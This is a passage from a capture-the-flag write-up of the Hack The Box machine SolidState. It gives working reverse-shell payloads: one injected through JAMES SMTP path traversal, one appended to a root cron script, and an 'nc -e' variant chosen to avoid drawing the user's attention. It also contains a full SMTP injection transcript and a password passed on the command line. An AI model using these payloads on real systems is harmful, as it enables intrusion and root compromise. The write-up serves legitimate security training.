+<p>You can see in the error that it’s trying to run everything from <code class="language-plaintext highlighter-rouge">0xdf@10.10.14.47</code> to the <code class="language-plaintext highlighter-rouge">FROM: 0xdf@10.10.14.47</code> as one command, due to the added <code class="language-plaintext highlighter-rouge">'</code>.</p>
+<p>At my <code class="language-plaintext highlighter-rouge">nc</code> listener, I got a shell:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>nc <span class="nt">-lnvp</span> 443
+<span class="go">Ncat: Version 7.80 ( https://nmap.org/ncat )              
+Ncat: Listening on :::443                                 
+Ncat: Listening on 0.0.0.0:443
+Ncat: Connection from 10.10.10.51.          
+Ncat: Connection from 10.10.10.51:49590.
+python -c 'import pty;pty.spawn("bash")'
+</span><span class="gp">${debian_chroot:+($debian_chroot)}mindy@solidstate:~$</span><span class="w">
+</span></code></pre></div></div>
+<p>I’ll look at improving the experience for mindy in <a href="#better-user-experience">Beyond Root</a>.</p>
+<h2 id="priv-mindy--root">Priv: mindy –&gt; root</h2>
+<h3 id="enumeration">Enumeration</h3>
+<p>In just looking around the file system, I usually check <code class="language-plaintext highlighter-rouge">/opt</code> and <code class="language-plaintext highlighter-rouge">/srv</code>, expecting to find both empty on most HTB machines. So finding a world-writable root-owned Python script in <code class="language-plaintext highlighter-rouge">/opt</code> caught my eye:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">${debian_chroot:+($debian_chroot)}mindy@solidstate:/$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-l</span> /opt/
+<span class="go">total 8
+drwxr-xr-x 11 root root 4096 Aug 22  2017 james-2.3.2
+-rwxrwxrwx  1 root root  105 Aug 22  2017 tmp.py
+</span></code></pre></div></div>
+<p>The script itself doesn’t do anything too interesting:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python
+</span><span class="kn">import</span> <span class="n">os</span>
+<span class="kn">import</span> <span class="n">sys</span>
+<span class="k">try</span><span class="p">:</span>
+     <span class="n">os</span><span class="p">.</span><span class="nf">system</span><span class="p">(</span><span class="sh">'</span><span class="s">rm -r /tmp/* </span><span class="sh">'</span><span class="p">)</span>
+<span class="k">except</span><span class="p">:</span>
+     <span class="n">sys</span><span class="p">.</span><span class="nf">exit</span><span class="p">()</span>
+</code></pre></div></div>
+<h3 id="pspy">PSpy</h3>
+<p>Given that file, I want to see if it’s being run, so I’ll upload <a href="https://github.com/DominicBreuker/pspy">PSpy</a>. I’ll start a Python webserver in my Pspy directory, and then grab the file with <code class="language-plaintext highlighter-rouge">wget</code> (grabbing the 32 bit version since this machine is 32 bit):</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">${debian_chroot:+($debian_chroot)}mindy@solidstate:/dev/shm$</span><span class="w"> </span>wget 10.10.14.47/pspy32
+<span class="go">--2020-04-29 22:39:06--  http://10.10.14.47/pspy32
+Connecting to 10.10.14.47:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 2656352 (2.5M) [application/octet-stream]
+Saving to: ‘pspy32’
+
+pspy32                        100%[=================================================&gt;]   2.53M  9.42MB/s    in 0.3s    
+
+2020-04-29 22:39:07 (9.42 MB/s) - ‘pspy32’ saved [2656352/2656352]
+</span></code></pre></div></div>
+<p>I see the request on the webserver:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali:/opt/pspy#</span><span class="w"> </span><span class="nb">ls</span>
+<span class="go">pspy32  pspy32s  pspy64  pspy64s
+</span><span class="gp">root@kali:/opt/pspy#</span><span class="w"> </span>python3 <span class="nt">-m</span> http.server 80
+<span class="go">Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.10.10.51 - - [29/Apr/2020 22:37:02] "GET /pspy32 HTTP/1.1" 200 -
+</span></code></pre></div></div>
+<p>Now <code class="language-plaintext highlighter-rouge">chmod</code> and run:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">${debian_chroot:+($debian_chroot)}mindy@solidstate:/dev/shm$</span><span class="w"> </span>./pspy32
+<span class="go">pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855
+
+
+     ██▓███    ██████  ██▓███ ▓██   ██▓
+    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
+    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
+    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
+    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
+    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒
+    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░
+    ░░       ░  ░  ░  ░░       ▒ ▒ ░░
+                   ░           ░ ░
+                               ░ ░     
+Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scannning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
+Draining file system events due to startup...
+done
+2020/04/29 22:39:40 CMD: UID=0    PID=997    | /usr/sbin/cups-browsed
+...[snip]...
+</span></code></pre></div></div>
+<p>Every three minutes I see:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">2020/04/29 22:42:01 CMD: UID=0    PID=1104   | /usr/sbin/CRON -f 
+2020/04/29 22:42:01 CMD: UID=0    PID=1105   | /usr/sbin/CRON -f 
+2020/04/29 22:42:01 CMD: UID=0    PID=1106   | /bin/sh -c python /opt/tmp.py 
+2020/04/29 22:42:02 CMD: UID=0    PID=1107   | python /opt/tmp.py 
+2020/04/29 22:42:02 CMD: UID=0    PID=1108   | sh -c rm -r /tmp/*
+2020/04/29 22:45:01 CMD: UID=0    PID=1150   | /usr/sbin/CRON -f 
+2020/04/29 22:45:01 CMD: UID=0    PID=1151   | /usr/sbin/CRON -f 
+2020/04/29 22:45:01 CMD: UID=0    PID=1152   | /bin/sh -c python /opt/tmp.py 
+2020/04/29 22:45:01 CMD: UID=0    PID=1153   | python /opt/tmp.py 
+2020/04/29 22:45:01 CMD: UID=0    PID=1154   | sh -c rm -r /tmp/*  
+</span></code></pre></div></div>
+<p>root is running this file.</p>
+<h3 id="exploit">Exploit</h3>
+<p>I’ll modify the file to add a reverse shell into it:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python
+</span><span class="kn">import</span> <span class="n">os</span>
+<span class="kn">import</span> <span class="n">sys</span>
+<span class="k">try</span><span class="p">:</span>
+     <span class="n">os</span><span class="p">.</span><span class="nf">system</span><span class="p">(</span><span class="sh">'</span><span class="s">rm -r /tmp/* </span><span class="sh">'</span><span class="p">)</span>
+<span class="k">except</span><span class="p">:</span>
+     <span class="n">sys</span><span class="p">.</span><span class="nf">exit</span><span class="p">()</span>
+<span class="n">os</span><span class="p">.</span><span class="nf">system</span><span class="p">(</span><span class="sh">'</span><span class="s">bash -c </span><span class="sh">"</span><span class="s">bash -i &gt;&amp; /dev/tcp/10.10.14.47/443 0&gt;&amp;1</span><span class="sh">"'</span><span class="p">)</span>
+</code></pre></div></div>
+<p>This last line should initiate a shell back to me once root runs it. At the next turn of three minutes, I get a connection:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>nc <span class="nt">-lnvp</span> 443
+<span class="go">Ncat: Version 7.80 ( https://nmap.org/ncat )
+Ncat: Listening on :::443
+Ncat: Listening on 0.0.0.0:443
+Ncat: Connection from 10.10.10.51.
+Ncat: Connection from 10.10.10.51:49594.
+bash: cannot set terminal process group (1170): Inappropriate ioctl for device
+bash: no job control in this shell
+</span><span class="gp">root@solidstate:~#</span><span class="w"> </span><span class="nb">id</span>
+<span class="go">uid=0(root) gid=0(root) groups=0(root)
+</span></code></pre></div></div>
+<p>And can grab <code class="language-plaintext highlighter-rouge">root.txt</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@solidstate:~#</span><span class="w"> </span><span class="nb">cat </span>root.txt
+<span class="go">b4c9723a************************
+</span></code></pre></div></div>
+<h2 id="beyond-root">Beyond Root</h2>
+<h3 id="curious-case-of-devtcp">Curious Case of /dev/tcp</h3>
+<p>Originally the first reverse shell payload I tried was <code class="language-plaintext highlighter-rouge">bash -i &gt;&amp; /dev/tcp/10.10.14.47/443 0&gt;&amp;1</code>. I set it manually:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>telnet 10.10.10.51 25
+<span class="go">Trying 10.10.10.51...
+Connected to 10.10.10.51.
+Escape character is '^]'.
+220 solidstate SMTP Server (JAMES SMTP Server 2.3.2) ready Wed, 29 Apr 2020 23:28:35 -0400 (EDT)
+EHLO 0xdf
+250-solidstate Hello 0xdf (10.10.14.47 [10.10.14.47])
+250-PIPELINING
+250 ENHANCEDSTATUSCODES
+MAIL FROM: &lt;'0xdf@10.10.14.47&gt;
+250 2.1.0 Sender &lt;'0xdf@10.10.14.47&gt; OK
+RCPT TO: &lt;../../../../../../../../etc/bash_completion.d&gt;
+250 2.1.5 Recipient &lt;../../../../../../../../etc/bash_completion.d@localhost&gt; OK
+DATA
+354 Ok Send data ending with &lt;CRLF&gt;.&lt;CRLF&gt;
+FROM: 0xdf@10.10.14.47
+
+'
+bash -i &gt;&amp; /dev/tcp/10.10.14.47/443 0&gt;&amp;1
+
+</span><span class="c">.
+</span><span class="go">250 2.6.0 Message received
+quit
+221 2.0.0 solidstate Service closing transmission channel
+Connection closed by foreign host.
+</span></code></pre></div></div>
+<p>And then triggered it, but got errors and the connection died:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>nc <span class="nt">-lnvp</span> 443
+<span class="go">Ncat: Version 7.80 ( https://nmap.org/ncat )
+Ncat: Listening on :::443
+Ncat: Listening on 0.0.0.0:443
+Ncat: Connection from 10.10.10.51.
+Ncat: Connection from 10.10.10.51:49650.
+: ambiguous redirect363837383831322D35.Repository.FileStreamStore: line 16: 1
+</span></code></pre></div></div>
+<p>However, when I tried the same payload in the <code class="language-plaintext highlighter-rouge">searchsploit</code> script, it worked. It was driving me crazy, so I went to look at the different payloads.</p>
+<p>For each email received by the account, there are two files in the user’s directory (for this user, that’s <code class="language-plaintext highlighter-rouge">/etc/bash_completion.d</code>), a Object Store and a Stream Store. For example:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@solidstate:/etc/bash_completion.d#</span><span class="w"> </span><span class="nb">ls</span>
+<span class="go">4D61696C313538383231373936323331372D38.Repository.FileObjectStore  4D61696C313538383231373936323331372D38.Repository.FileStreamStore
+</span></code></pre></div></div>
+<p>The Stream Store is the one that contains the payload. It looks like a raw email:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Return-Path: &lt;'0xdf@10.10.14.47&gt;
+Message-ID: &lt;8915397.8.1588217962318.JavaMail.root@solidstate&gt;
+MIME-Version: 1.0
+Content-Type: text/plain; charset=us-ascii
+Content-Transfer-Encoding: 7bit
+Delivered-To: ../../../../../../../../etc/bash_completion.d@localhost
+Received: from 10.10.14.47 ([10.10.14.47])
+          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 252
+          for &lt;../../../../../../../../etc/bash_completion.d@localhost&gt;;
+          Wed, 29 Apr 2020 23:39:07 -0400 (EDT)
+Date: Wed, 29 Apr 2020 23:39:07 -0400 (EDT)
+FROM: 0xdf@10.10.14.47
+
+'
+/bin/nc -e /bin/bash 10.10.14.47 443 &amp;
+</code></pre></div></div>
+<p>To try to figure out why the scripted version worked while the manual version didn’t, with both emails sitting in <code class="language-plaintext highlighter-rouge">/etc/bash_completion.d</code>, I ran <code class="language-plaintext highlighter-rouge">diff</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@solidstate:/etc/bash_completion.d#</span><span class="w"> </span>diff 4D61696C313538383231363034383637362D33.Repository.FileStreamStore 4D61696C313538383231363132353231352D34.Repository.FileStreamStore
+<span class="go">1,2c1,2
+</span><span class="diff-removed">&lt; Return-Path: &lt;'0xdf@10.10.14.47&gt;
+&lt; Message-ID: &lt;22085305.3.1588216048676.JavaMail.root@solidstate&gt;
+</span><span class="diff-lines">---
+</span><span class="diff-added">&gt; Return-Path: &lt;'@team.pl&gt;
+&gt; Message-ID: &lt;9571892.4.1588216125216.JavaMail.root@solidstate&gt;
+</span><span class="go">8c8
+</span><span class="diff-removed">&lt;           by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 614
+</span><span class="diff-lines">---
+</span><span class="diff-added">&gt;           by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 47
+</span><span class="go">10,12c10,12
+</span><span class="diff-removed">&lt;           Wed, 29 Apr 2020 23:07:28 -0400 (EDT)
+&lt; Date: Wed, 29 Apr 2020 23:07:28 -0400 (EDT)
+&lt; FROM: 0xdf@10.10.14.47
+</span><span class="diff-lines">---
+</span><span class="diff-added">&gt;           Wed, 29 Apr 2020 23:08:45 -0400 (EDT)
+&gt; Date: Wed, 29 Apr 2020 23:08:45 -0400 (EDT)
+&gt; From: team@team.pl
+</span><span class="go">14,15c14,15
+</span><span class="diff-removed">&lt; '
+&lt; bash -i &gt;&amp; /dev/tcp/10.10.14.47/443 0&gt;&amp;1
+</span><span class="diff-lines">---
+</span><span class="diff-added">&gt; '
+&gt; bash -i &gt;&amp; /dev/tcp/10.10.14.47/443 0&gt;&amp;1
+</span></code></pre></div></div>
+<p>It all seemed superficial, such as the ID or the from address, until the last difference, which, didn’t look different at all. I opened them both in <code class="language-plaintext highlighter-rouge">vi</code> to see if there was something missing, and there was a subtle difference:</p>
+<table>
+<thead>
+<tr>
+<th>Script</th>
+<th>Manual</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20200429231545372.webp" type="image/webp"/>
+<img alt="image-20200429231545372" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20200429231545372.png"/>
+</picture></td>
+<td><picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20200429233306700.webp" type="image/webp"/>
+<img alt="image-20200429233306700" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20200429233306700.png"/>
+</picture></td>
+</tr>
+</tbody>
+</table>
+<p>In my manual interaction, there’s extra carriage returns (<code class="language-plaintext highlighter-rouge">\r</code>, printed as <code class="language-plaintext highlighter-rouge">^M</code> in <code class="language-plaintext highlighter-rouge">vi</code>) after the <code class="language-plaintext highlighter-rouge">'</code> and after the payload. I don’t quite know why that made such a difference, but removing the two <code class="language-plaintext highlighter-rouge">^M</code> in vi (putting the cursor over the character and pushing <code class="language-plaintext highlighter-rouge">x</code>)  made it work. I could test it by running <code class="language-plaintext highlighter-rouge">bash 4D61696C313538383231373333333237352D37.Repository.FileStreamStore</code>.</p>
+<h3 id="better-user-experience">Better User Experience</h3>
+<p>It bugged me a little bit that when I connected SSH as mindy, the SSH shell just hung while I worked on my <code class="language-plaintext highlighter-rouge">nc</code> shell. I wanted to see if I could start a payload that didn’t ruin the user’s SSH connection. In a real situation, I wouldn’t want to break the user’s experience and draw attention to myself.</p>
+<p>The best way to do this was with the <code class="language-plaintext highlighter-rouge">nc -e</code> payload. I found that if I added a trailing <code class="language-plaintext highlighter-rouge">&amp;</code>, it would start the process in the background and allow the triggering process to continue. The email looks like:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Return-Path: &lt;'0xdf@10.10.14.47&gt;^M
+Message-ID: &lt;8915397.8.1588217962318.JavaMail.root@solidstate&gt;^M
+MIME-Version: 1.0^M
+Content-Type: text/plain; charset=us-ascii^M
+Content-Transfer-Encoding: 7bit^M
+Delivered-To: ../../../../../../../../etc/bash_completion.d@localhost^M
+Received: from 10.10.14.47 ([10.10.14.47])^M
+          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 252^M
+          for &lt;../../../../../../../../etc/bash_completion.d@localhost&gt;;^M
+          Wed, 29 Apr 2020 23:39:07 -0400 (EDT)^M
+Date: Wed, 29 Apr 2020 23:39:07 -0400 (EDT)^M
+FROM: 0xdf@10.10.14.47^M
+^M
+'^M
+/bin/nc -e /bin/bash 10.10.14.47 443 &amp;^M
+</code></pre></div></div>
+<p>mindy’s SSH session has some extra junk text, but the prompt comes in live immediately:</p>
+<div class="language-console sshpass-disclaimer highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>sshpass <span class="nt">-p</span> <span class="s1">'P@55W0rd1!2@'</span> ssh mindy@10.10.10.51
+<span class="go">Linux solidstate 4.9.0-3-686-pae #1 SMP Debian 4.9.30-2+deb9u3 (2017-08-06) i686
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Wed Apr 29 22:44:26 2020 from 10.10.14.47
+-rbash: $'\254\355\005sr\036org.apache.james.core.MailImpl\304x\r\345\274\317ݬ\003': command not found
+-rbash: L: command not found
+-rbash: attributestLjava/util/HashMap: No such file or directory
+-rbash: L
+         errorMessagetLjava/lang/String: No such file or directory
+-rbash: L
+         lastUpdatedtLjava/util/Date: No such file or directory
+-rbash: Lmessaget!Ljavax/mail/internet/MimeMessage: No such file or directory
+-rbash: $'L\004nameq~\002L': command not found
+-rbash: recipientstLjava/util/Collection: No such file or directory
+-rbash: L: command not found
+-rbash: $'remoteAddrq~\002L': command not found
+-rbash: remoteHostq~LsendertLorg/apache/mailet/MailAddress: No such file or directory
+-rbash: $'\221\222\204m\307{\244\002\003I\003posL\004hostq~\002L\004userq~\002xp': command not found
+-rbash: $'L\005stateq~\002xpsr\035org.apache.mailet.MailAddress': command not found
+-rbash: 0xdf@10.10.14.47&gt;
+Message-ID: &lt;8915397.8.1588217962318.JavaMail.root@solidstate&gt;
+MIME-Version: 1.0
+Content-Type: text/plain; charset=us-ascii
+Content-Transfer-Encoding: 7bit
+Delivered-To: ../../../../../../../../etc/bash_completion.d@localhost
+Received: from 10.10.14.47 ([10.10.14.47])
+          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 252
+          for &lt;../../../../../../../../etc/bash_completion.d@localhost&gt;;
+          Wed, 29 Apr 2020 23:39:07 -0400 (EDT)
+Date: Wed, 29 Apr 2020 23:39:07 -0400 (EDT)
+FROM: 0xdf@10.10.14.47
+
+: No such file or directory
+-rbash: $'\r': command not found
+mindy@solidstate:~$ ls
+bin  user.txt
+</span></code></pre></div></div>
+<p>And I have a shell:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>nc <span class="nt">-lnvp</span> 443
+<span class="go">Ncat: Version 7.80 ( https://nmap.org/ncat )
+Ncat: Listening on :::443
+Ncat: Listening on 0.0.0.0:443
+Ncat: Connection from 10.10.10.51.
+Ncat: Connection from 10.10.10.51:49678.
+id
+uid=1001(mindy) gid=1001(mindy) groups=1001(mindy)
+</span></code></pre></div></div>
+</div>
+</div>
+</div><a class="u-url" hidden="" href="/2020/04/30/htb-solidstate.html"></a>
+</article>
